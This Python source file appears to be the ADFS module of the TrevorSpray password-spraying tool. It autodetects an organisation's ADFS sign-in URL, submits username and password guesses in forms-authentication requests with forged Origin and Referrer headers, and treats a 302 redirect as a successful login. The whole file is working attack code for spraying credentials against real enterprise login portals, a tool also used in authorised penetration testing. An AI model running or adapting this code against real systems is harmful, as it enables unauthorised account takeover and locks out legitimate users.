import logging
from bs4 import BeautifulSoup
from .base import BaseSprayModule
from ..util import is_domain, is_url
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

log = logging.getLogger("trevorspray.sprayers.adfs")


class ADFS(BaseSprayModule):
    userparm = "UserName"
    passparam = "Password"

    request_data = {
        "Kmsi": "true",
        "AuthMethod": "FormsAuthentication",
        "UserName": "{username}",
        "Password": "{password}",
    }

    def initialize(self):
        discovery = self.trevor.discovery(self.url)
        parsed_url = urlparse(self.url)
        userrealm = discovery.getuserrealm()
        namespace = userrealm.get("NameSpaceType", "Unknown")
        if namespace != "Federated":
            log.warning(
                f'NameSpaceType for {self.url} is "{namespace}", not "Federated". You may want to try the "msol" module instead.'
            )

        if is_domain(self.url) and not is_url(self.url):
            log.info(
                f"Specified URL {self.url} is a domain, autodetecting ADFS AuthURL"
            )
            adfs_url = userrealm.get("AuthURL", "")
            if adfs_url:
                log.info(f"Successfully detected ADFS AuthURL: {adfs_url}")
                self.url = adfs_url
                parsed_url = urlparse(self.url)
            else:
                log.warn(
                    f"Failed to detect ADFS AuthURL. Please make sure you specify the full ADFS url (example: https://sts.evilcorp.com/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc=)"
                )

        if not parsed_url.scheme:
            parsed_url = urlparse(f"https://{urlunparse(parsed_url)}")

        # add query parameters if only a domain is specified
        if not parsed_url.query:
            log.info(f"No query parameters specified in {self.url}, correcting")
            origin = urlunparse(parsed_url._replace(query="", path=""))
            self.url = f"{origin}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc="
            log.info(f"New AuthURL: {self.url}")

        return True

    def create_request(self, username, password, proxythread):
        request = super().create_request(username, password, proxythread)
        parsed_url = urlparse(self.url)

        # replace dummy username query parameter in the AuthURL
        query = parse_qs(parsed_url.query, keep_blank_values=True)
        if "username" in query:
            query["username"] = [username]
            parsed_url = parsed_url._replace(query=urlencode(query, doseq=True))
            request.url = urlunparse(parsed_url)
            log.debug(f"Replaced username in URL, new URL: {request.url}")
        request.headers["Referrer"] = request.url
        request.headers["Origin"] = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return request

    def check_response(self, response):
        valid = False
        exists = None
        locked = None
        msg = ""

        status_code = getattr(response, "status_code", 0)
        cookies = getattr(response, "cookies", {})
        content = getattr(response, "content", b"")
        msg = f"Status code: {status_code}, Response length: {len(content)}" + (
            f", Cookies: {dict(cookies)}" if cookies else ""
        )

        error_msg = ""
        if content:
            soup = BeautifulSoup(content, "html.parser")
            found = soup.find(id="errorText")
            error_msg = getattr(found, "text", "")

        if error_msg:
            msg = f"{msg} {error_msg}"

        if status_code == 302:
            exists = True
            valid = True

        return (valid, exists, locked, msg)
